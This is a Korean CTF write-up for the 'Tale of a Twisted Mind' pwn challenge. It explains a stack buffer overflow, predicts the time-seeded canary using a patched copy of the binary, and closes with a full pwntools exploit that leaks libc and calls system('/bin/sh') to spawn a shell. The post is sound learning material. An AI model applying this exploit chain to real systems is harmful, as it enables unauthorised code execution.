---
layout: post
title: ! "[Byte Bandits] Tale of a Twisted Mind Writeup"
comments: true
excerpt_separator: <!--more-->
tags:
  - MyriaBreak
  - Write-up
  - CTF
  - ByteBanditsCTF2018
---

Pwn문제를 뭘 풀까 찾다가 2달전에 했던 `Byte Bandits CTF 2018`에서 봤던 문제를 풀어보기로 했다.
`Tale of a Twisted Mind`라는 문제로 CTF 당시에는 Pwnable에 익숙하지 않은지라 풀지 못했으나 지금은 어느정도 개념이 잡혔고, 문제점수 또한 250점으로 난이도가 적당할 거 같아서 풀어보기로 하였다.

<!--more-->

```
We all know how intelligent Layat is... He says that since everyone knows how gcc programs are protected, he set out to protect them by his own secret way.

But Alas! Even the compiler asked "Art Though Dumb?"

nc 34.218.199.37 6000
```

문제는 위와 같고, 바이너리 파일과 라이브러리를 주므로 이걸 분석하면 된다.
당연하지만 현재 서버는 닫혔고, 라이브러리를 주긴했으나 그냥 로컬기준으로 해서 문제를 풀겠다.(물론 LD_PRELOAD로 설정해줘도 되긴하다.)

먼저 `checksec`을 이용해 어떤 보호기법들이 적용되어있는지 살펴보겠다.

![]({{ site.baseurl }}/images/myria/twisted-writeup/twisted_01.PNG)  

`32bit`이고 `Canary`와 `NX`가 걸려있어 매우 어려울 것 같은 느낌이다.
아직 뭘 해야할지 잘 모르겠으니, 먼저 실행해보자.
실행하면 아래와 같이 모듈러연산을 하는 식을 던져주는데, 이게 풀어도 풀어도 계속 문제를 준다 ㅡㅡ;

![]({{ site.baseurl }}/images/myria/twisted-writeup/twisted_02.PNG)  

일단 프로그램의 시작부분이 어떻게 시작하는 지 알았으니 이제 IDA를 사용해 저 부분을 한번 살펴보자.
저 문구 자체는 `String Window`에서 쉽게 찾을 수 있고, 거기서 거슬러 올라가면 이 프로그램의 흐름을 알 수 있다.

![]({{ site.baseurl }}/images/myria/twisted-writeup/twisted_03.PNG)  

여기서 사용되고 있고, 사용하고 있는 함수를 찾아보면 `sub_8048867()`에서 찾을 수 있고, 여기서 더 올라가보면 이 함수가 312번 호출되는 것을 알 수 있다.

![]({{ site.baseurl }}/images/myria/twisted-writeup/twisted_04.PNG)
![]({{ site.baseurl }}/images/myria/twisted-writeup/twisted_05.PNG)

그렇다면 저 함수를 312번 호출이 끝나면 무엇이 수행되는지 보자.
아래 그림을 통해 이 프로그램이 대략적으로 어떻게 돌아가는지 표현해보았다.

![]({{ site.baseurl }}/images/myria/twisted-writeup/twisted_06.PNG)  

사용자에게 312번의 수식계산(Question)을 시키고, 이를 통과하게 되면 사용자가 원하는 값을 fgets를 통해 `buffer`에 쓸 수 있다.
그런데 여기서 buf에 해당하는 `s`는 `bp-14`의 위치에 있는데, fgets를 통해 `46`의 길이를 읽게되므로 `Buffer Overflow`가 일어나는 것을 알 수 있다.

```
  int v2; // eax@1
  int v3; // eax@2
  int result; // eax@3
  int v5; // eax@6
  int v6; // edx@9
  signed int i; // [sp+4h] [bp-18h]@1
  char s; // [sp+8h] [bp-14h]@8
  int v9; // [sp+18h] [bp-4h]@1
```

그럼 이제 bof를 이용해 함수 흐름을 조작해서 libc_base를 leak하고, 최종적으로는 ROP로 system("/bin/sh")를 수행할 수 있을 것이다!
... 인줄 알았지만 아직 `Canary`가 남아있었다 ...

다시 위에서 정리해놓은 것을 보면 `Canary`는 `sub_8048801()`에 의해 27~29줄에서 다시 설정된다.
그런데 이 `sub_8048801()`이란 함수가 이전에도 많이 쓰이는데... 바로 처음에 사용자에게 던져주는 수식의 난수생성에 쓰인다.

여러번 실행해보면 알겠지만 주어지는 수식의 값이 항상 다르다는 것을 알 수 있는데, IDA를 통해 hexray한 코드를 보면
이 random한 값은 `time(0)`에 의한 결과이다. time(0)의 값이 이 프로그램에서는 C함수에서 srand(seed)의 seed값으로 들어가는 것과 같은 효과가 여기서 나타난다.
그러므로 time(0)이 같다면 항상 같은 난수 생성이 가능하다.

![]({{ site.baseurl }}/images/myria/twisted-writeup/twisted_07.PNG)  

time(0)의 값을 설정하고 랜덤한 값을 `312*2`번 뽑고, 한번 더 뽑게되면 우리가 원하는 `Canary`값을 얻을 수 있다.
그럼 이제 어떻게 할까?
Canary값을 구하기 위한 두가지 방법이 있다.

1. 해당 프로그램에서 Random값을 뽑아내는 알고리즘과 같은 알고리즘을 쓰는 소스를 구현한다.
2. 바이너리 code patch를 통해 우리가 원하는 Canary값을 출력하게 한다.

여기서는 후자, code patch를 이용해서 Canary값을 출력하는 방법을 사용하겠다.

![]({{ site.baseurl }}/images/myria/twisted-writeup/twisted_08.PNG)  

위에서 Canary값을 설정하는 코드를 보면 Canary값을 설정한 후, bss영역(전역변수)의 dword_804AA28에 저장하게되는데
이 부분을 puts을 통해 출력하게 patch한다면 우리가 원하는 Canary값이 puts를 통해 출력될 것이다.

![]({{ site.baseurl }}/images/myria/twisted-writeup/twisted_09.PNG)

자! 이제 원본파일인 `twisted`와 Canary를 출력하게 patch한 `twisted_modipy`를 동시에 실행한다면
time(0)의 값을 같으므로 같은 난수생성을 하게 되고, 같은 Canary값을 가질 것이다. 
이 때 우리는 `twisted_modipy`를 통해 Canary값을 얻을 수 있으므로, `twisted`에서 bof를 성공적으로 일으킬수 있다.

그럼 이제 코드짜는 일만 남았다..
계획은 일단 아래와 같다.

1. 먼저 puts.plt로 리턴하여 puts.got를 인자로 넣어 `puts_addr`을 구한다.
2. 위에서 구한 puts_addr을 이용해서 `libc_base`를 구한다.
3. `libc_base`를 통해 system함수와 "/bin/sh"의 주소를 구한다.
4. `system("/bin/sh")`를 실행한다.

급마무리하는 느낌이 있지만, 익스코드는 아래와 같다.

```python
from pwn import *
import string

#context.log_level = 'debug'

elf = ELF("./twisted")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

conn = process("./twisted", env={"LD_PRELOAD":"libc.so.6"})
patched = process("./twisted_modify", env={"LD_PRELOAD":"libc.so.6"})

for i in range(0,312):
	Equation = conn.recvuntil("=")
	patched_Equation = patched.recvuntil("=")
	patched.recvline()
	conn.recvline()
	if not (Equation == patched_Equation):
		break
	op1, op2 = Equation[:-1].split("%")
	result = int(op1) % int(op2)
	conn.sendline(str(result))
	patched.sendline(str(result))

patched.recvline()
canary = patched.recv(4)
patched.close()
print("")

log.info("canary : 0x%x\n" % u32(canary))

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

fgets_sbuf = 0x8048979
bss = 0x804A800

payload  = "A"*16
payload += canary
payload += p32(bss)	# ebp
payload += p32(puts_plt)
payload += p32(fgets_sbuf)
payload += p32(puts_got)

conn.recvuntil(":")
conn.send("a")	## getchar != '\n'
conn.sendline(payload)

conn.recvline()
puts_addr = conn.recv(4)
puts_sym = libc.symbols['puts']

libc_base = u32(puts_addr)-puts_sym
system_offset = 0x40310
bin_sh_offset = 0x162d4c
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset

log.info("base_libc   : 0x%x" % libc_base)
log.info("puts_addr   : 0x%x" % u32(puts_addr))
log.info("system_addr : 0x%x" % system_addr)
log.info("bin_sh_addr : 0x%x" % bin_sh_addr)

payload  = "A"*16
payload += canary
payload += p32(bss)	# ebp
payload += p32(system_addr)
payload += "BBBB"
payload += p32(bin_sh_addr)

conn.sendline(payload)
conn.interactive()

```

위 파이썬 익스코드를 실행하면 Shell을 획득할 수 있다.

![]({{ site.baseurl }}/images/myria/twisted-writeup/twisted_10.PNG)  

### *후기

재미있는 문제였다. 일단 seed값을 똑같이 설정해서 같은 랜덤값을 얻는 문제를 실제로 풀어본 것이 처음이였다.

뭐... 그 만큼 삽질을 많이해서 굉장히 시간을 많이 잡아먹었지만 ㅡㅡ;

일단 `while(getchar() == 10) ;` 부분이 당연히 버퍼를 비워주기 위한 코드인줄 알아서 익스할때 익스가 제대로 되지않아서 많은 시간을 잡아먹었고,

최근에 execve() 함수 안에 "/bin/sh"를 호출해주는 부분으로 바로 뛰어 쉘을 한방에 띄울 수 있다는 `oneshot gadget`이란 것을 알게 되어 이 원샷가젯을 사용하려다가 굉장히 많은 시간을 잡아먹었다.
일단 원샷가젯에 대한 결론을 말하자면... 32bit 바이너리라서 원샷가젯이 안먹힌다;; 64bit에서는 정상적으로 사용가능하므로 64bit 익스에만 사용하도록 하자.

그래도 삽질한 만큼 많은 걸 배운것 같다. 이상 마무리~
